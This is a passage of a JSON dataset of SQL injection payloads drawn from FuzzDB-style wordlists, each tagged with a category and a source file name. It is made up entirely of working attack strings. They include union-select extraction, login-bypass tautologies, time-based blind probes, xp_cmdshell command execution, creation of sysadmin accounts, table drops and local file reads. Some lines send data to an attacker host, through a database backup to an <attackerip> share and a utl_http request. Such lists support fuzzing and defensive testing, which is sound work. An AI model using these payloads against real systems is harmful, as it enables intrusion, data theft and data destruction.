    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "1' and 1=(select count(*) from tablenames); ",
    "category": "sql injection",
    "source_file": "FUZZDB_MYSQL.txt"
  },
  {
    "payload": "1' or '1'='1",
    "category": "sql injection",
    "source_file": "FUZZDB_MYSQL.txt"
  },
  {
    "payload": "' and 0=benchmark(3000000,MD5(1))%20/*",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "' and 0=benchmark(3000000,MD5(1))%20",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "' and 0=benchmark(3000000,MD5(1))%20%23",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "\" and 0=benchmark(3000000,MD5(1))%20/*",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "\" and 0=benchmark(3000000,MD5(1))%20",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "\" and 0=benchmark(3000000,MD5(1))%20%23",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "') and 0=benchmark(3000000,MD5(1))%20/*",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "') and 0=benchmark(3000000,MD5(1))%20",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "') and 0=benchmark(3000000,MD5(1))%20%23",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "\") and 0=benchmark(3000000,MD5(1))%20/*",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "\") and 0=benchmark(3000000,MD5(1))%20",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "\") and 0=benchmark(3000000,MD5(1))%20%23",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "')) and 0=benchmark(3000000,MD5(1))%20/*",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "')) and 0=benchmark(3000000,MD5(1))%20",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "')) and 0=benchmark(3000000,MD5(1))%20%23",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "\")) and 0=benchmark(3000000,MD5(1))%20/*",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "\")) and 0=benchmark(3000000,MD5(1))%20",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "\")) and 0=benchmark(3000000,MD5(1))%20%23",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "'))) and 0=benchmark(3000000,MD5(1))%20/*",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "'))) and 0=benchmark(3000000,MD5(1))%20",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "'))) and 0=benchmark(3000000,MD5(1))%20%23",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "\"))) and 0=benchmark(3000000,MD5(1))%20/*",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "\"))) and 0=benchmark(3000000,MD5(1))%20",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "\"))) and 0=benchmark(3000000,MD5(1))%20%23",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "')))) and 0=benchmark(3000000,MD5(1))%20/*",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "')))) and 0=benchmark(3000000,MD5(1))%20",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "')))) and 0=benchmark(3000000,MD5(1))%20%23",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "\")))) and 0=benchmark(3000000,MD5(1))%20/*",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "\")))) and 0=benchmark(3000000,MD5(1))%20",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "\")))) and 0=benchmark(3000000,MD5(1))%20%23",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL-WHERE_Time.txt"
  },
  {
    "payload": "1/*'*/",
    "category": "sql injection",
    "source_file": "Generic_Fuzz.txt"
  },
  {
    "payload": "1/*!1111'*/",
    "category": "sql injection",
    "source_file": "Generic_Fuzz.txt"
  },
  {
    "payload": "1'||'asd'||'",
    "category": "sql injection",
    "source_file": "Generic_Fuzz.txt"
  },
  {
    "payload": "'or''='",
    "category": "sql injection",
    "source_file": "Generic_Fuzz.txt"
  },
  {
    "payload": "# replace regex with your fuzzer for best results <attackerip> <sharename>",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL_Enumeration.txt"
  },
  {
    "payload": "# might need to terminate payloads with ;",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL_Enumeration.txt"
  },
  {
    "payload": "exec master..xp_cmdshell 'ipconfig+/all'",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL_Enumeration.txt"
  },
  {
    "payload": "exec master..xp_cmdshell 'net+view'",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL_Enumeration.txt"
  },
  {
    "payload": "exec master..xp_cmdshell 'net+users'",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL_Enumeration.txt"
  },
  {
    "payload": "exec master..xp_cmdshell 'ping+<attackerip>'",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL_Enumeration.txt"
  },
  {
    "payload": "BACKUP database master to disks='\\\\<attackerip>\\<attackerip>\\backupdb.dat'",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL_Enumeration.txt"
  },
  {
    "payload": "create table myfile (line varchar(8000))\" bulk insert foo from 'c:\\inetpub\\wwwroot\\auth.asp'\" select * from myfile\"",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL_Enumeration.txt"
  },
  {
    "payload": "' or ''-'",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "' or '' '",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "' or ''&'",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "' or ''^'",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "' or ''*'",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "\" or \"\"-\"",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "\" or \"\" \"",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "\" or \"\"&\"",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "\" or \"\"^\"",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "\" or \"\"*\"",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "\" or true",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "' or true",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "\") or true",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "') or true",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "' or 'x'='x",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "') or ('x')=('x",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "')) or (('x'))=(('x",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "\" or \"x\"=\"x",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "\") or (\"x\")=(\"x",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "\")) or ((\"x\"))=((\"x",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin' ",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin' #",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin'/*",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin' or '1'='1",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin' or '1'='1'",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin' or '1'='1'#",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin' or '1'='1'/*",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin'or 1=1 or ''='",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin' or 1=1",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin' or 1=1#",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin' or 1=1/*",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin') or ('1'='1",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin') or ('1'='1'",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin') or ('1'='1'#",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin') or ('1'='1'/*",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin') or '1'='1",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin') or '1'='1'",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin') or '1'='1'#",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin') or '1'='1'/*",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin\" ",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin\" #",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin\"/*",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin\" or \"1\"=\"1",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin\" or \"1\"=\"1\"",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin\" or \"1\"=\"1\"#",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin\" or \"1\"=\"1\"/*",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin\"or 1=1 or \"\"=\"",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin\" or 1=1",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin\" or 1=1#",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin\" or 1=1/*",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin\") or (\"1\"=\"1",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin\") or (\"1\"=\"1\"",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin\") or (\"1\"=\"1\"#",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin\") or (\"1\"=\"1\"/*",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin\") or \"1\"=\"1",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin\") or \"1\"=\"1\"",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin\") or \"1\"=\"1\"#",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "admin\") or \"1\"=\"1\"/*",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "1' or 1.e(1) or '1'='1",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055",
    "category": "sql injection",
    "source_file": "Auth_Bypass.txt"
  },
  {
    "payload": "\" or sleep(5)#",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "' or sleep(5)#",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "\" or sleep(5)=\"",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "' or sleep(5)='",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "\") or sleep(5)=\"",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "') or sleep(5)='",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "\")) or sleep(5)=\"",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "')) or sleep(5)='",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": ";waitfor delay '0:0:5'",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": ");waitfor delay '0:0:5'",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "';waitfor delay '0:0:5'",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "\";waitfor delay '0:0:5'",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "');waitfor delay '0:0:5'",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "\");waitfor delay '0:0:5'",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "));waitfor delay '0:0:5'",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "'));waitfor delay '0:0:5'",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "\"));waitfor delay '0:0:5'",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "\" or benchmark(10000000,MD5(1))#",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "' or benchmark(10000000,MD5(1))#",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "\") or benchmark(10000000,MD5(1))#",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "') or benchmark(10000000,MD5(1))#",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "\")) or benchmark(10000000,MD5(1))#",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "')) or benchmark(10000000,MD5(1))#",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "\" or pg_sleep(5)",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "' or pg_sleep(5)",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "\") or pg_sleep(5)",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "') or pg_sleep(5)",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "\")) or pg_sleep(5)",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "')) or pg_sleep(5)",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "||pg_sleep(5)",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "1||pg_sleep(5)",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "\"||pg_sleep(5)",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "'||pg_sleep(5)",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "1)||pg_sleep(5)",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "\")||pg_sleep(5)",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "')||pg_sleep(5)",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "1))||pg_sleep(5)",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "\"))||pg_sleep(5)",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "'))||pg_sleep(5)",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "SLEEP(5)=\"",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "SLEEP(5)='",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "or SLEEP(5)=\"",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "or SLEEP(5)='",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "waitfor delay '00:00:05'",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "waitfor delay '00:00:05'#",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "&&SLEEP(5)",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "&&SLEEP(5)#",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "' AnD SLEEP(5) ANd '1",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "'&&SLEEP(5)&&'1",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "+benchmark(3200,SHA1(1))+'",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "+ SLEEP(10) + '",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "SLEEP(1)/*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
    "category": "sql injection",
    "source_file": "Generic_TimeBased.txt"
  },
  {
    "payload": "'; exec master..xp_cmdshell 'ping 10.10.1.2'",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL.txt"
  },
  {
    "payload": "'create user name identified by 'pass123' ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL.txt"
  },
  {
    "payload": "'create user name identified by pass123 temporary tablespace temp default tablespace users;",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL.txt"
  },
  {
    "payload": "' ; drop table temp ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL.txt"
  },
  {
    "payload": "'exec sp_addlogin 'name' , 'password' ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL.txt"
  },
  {
    "payload": "' exec sp_addsrvrolemember 'name' , 'sysadmin' ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL.txt"
  },
  {
    "payload": "' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL.txt"
  },
  {
    "payload": "' grant connect to name; grant resource to name; ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL.txt"
  },
  {
    "payload": "' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL.txt"
  },
  {
    "payload": "' or 1=1 ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL.txt"
  },
  {
    "payload": "' union (select @@version) ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL.txt"
  },
  {
    "payload": "' union (select NULL, (select @@version)) ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL.txt"
  },
  {
    "payload": "' union (select NULL, NULL, (select @@version)) ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL.txt"
  },
  {
    "payload": "' union (select NULL, NULL, NULL,  (select @@version)) ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL.txt"
  },
  {
    "payload": "' union (select NULL, NULL, NULL, NULL,  (select @@version)) ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL.txt"
  },
  {
    "payload": "' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL.txt"
  },
  {
    "payload": "# fuzz interesting absolute filepath/filename into <filepath>",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL_ReadLocalFiles.txt"
  },
  {
    "payload": "create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;",
    "category": "sql injection",
    "source_file": "FUZZDB_MySQL_ReadLocalFiles.txt"
  },
  {
    "payload": "' or '1'='1",
    "category": "sql injection",
    "source_file": "FUZZDB_Oracle.txt"
  },
  {
    "payload": "'||utl_http.request('httP://192.168.1.1/')||'",
    "category": "sql injection",
